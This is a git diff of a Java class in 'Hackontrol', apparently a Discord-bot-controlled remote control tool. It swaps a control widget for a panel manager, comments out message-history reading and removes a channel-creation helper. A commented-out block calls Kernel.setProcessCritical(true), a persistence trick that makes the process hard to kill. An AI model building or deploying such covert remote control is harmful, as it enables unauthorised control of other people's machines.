@@ -13,21 +13,20 @@ import org.slf4j.LoggerFactory;
 import com.khopan.hackontrol.manager.Manager;
 import com.khopan.hackontrol.module.Module;
 import com.khopan.hackontrol.nativelibrary.Information;
+import com.khopan.hackontrol.panel.PanelManager;
 import com.khopan.hackontrol.registration.ManagerRegistry;
 import com.khopan.hackontrol.registration.ModuleRegistry;
+import com.khopan.hackontrol.registration.PanelRegistry;
 import com.khopan.hackontrol.registry.ClassRegistration;
 import com.khopan.hackontrol.registry.RegistryType;
 import com.khopan.hackontrol.registry.implementation.FilteredTypeRegistry;
 import com.khopan.hackontrol.security.SecurityManager;
 import com.khopan.hackontrol.utils.ErrorHandler;
 import com.khopan.hackontrol.utils.HackontrolError;
-import com.khopan.hackontrol.widget.ControlWidget;
 
 import net.dv8tion.jda.api.JDA;
 import net.dv8tion.jda.api.JDABuilder;
 import net.dv8tion.jda.api.entities.Guild;
-import net.dv8tion.jda.api.entities.Message;
-import net.dv8tion.jda.api.entities.MessageHistory;
 import net.dv8tion.jda.api.entities.channel.concrete.Category;
 import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
 import net.dv8tion.jda.api.requests.GatewayIntent;
@@ -94,20 +93,19 @@ public class Hackontrol {
 
 		this.category = category;
 		SecurityManager.configureViewPermission(this.category.getManager());
-		TextChannel channel = this.guild.getTextChannelById(1249281558855028787L);
+		/*TextChannel channel = this.guild.getTextChannelById(1249281558855028787L);
 		List<Message> list = MessageHistory.getHistoryFromBeginning(channel).complete().getRetrievedHistory();
 
 		for(Message message : list) {
 			message.getButtons();
 			Hackontrol.LOGGER.info(message.getContentRaw());
-		}
+		}*/
 
-		ControlWidget widget = ControlWidget.newBuilder().build();
-		/*PanelManager panelManager = new PanelManager();
+		PanelManager panelManager = new PanelManager();
 		PanelRegistry.register(panelManager);
-		panelManager.start(this.category);
+		panelManager.initialize(this.category);
 
-		for(Module module : this.moduleList) {
+		/*for(Module module : this.moduleList) {
 			TextChannel textChannel = this.getOrCreateTextChannelInCategory(this.category, module.getName());
 			SecurityManager.configureViewPermission(textChannel.getManager());
 			module.hackontrol = this;
@@ -128,23 +126,6 @@ public class Hackontrol {
 		}
 
 		Kernel.setProcessCritical(true);*/
-	}
-
-	private TextChannel getOrCreateTextChannelInCategory(Category category, String name) {
-		TextChannel targetChannel = null;
-
-		for(TextChannel channel : category.getTextChannels()) {
-			if(channel.getName().equalsIgnoreCase(name)) {
-				targetChannel = channel;
-				break;
-			}
-		}
-
-		if(targetChannel != null) {
-			return targetChannel;
-		}
-
-		return category.createTextChannel(name).complete();
 	}
 
 	private void handleError(Thread thread, Throwable Errors) {
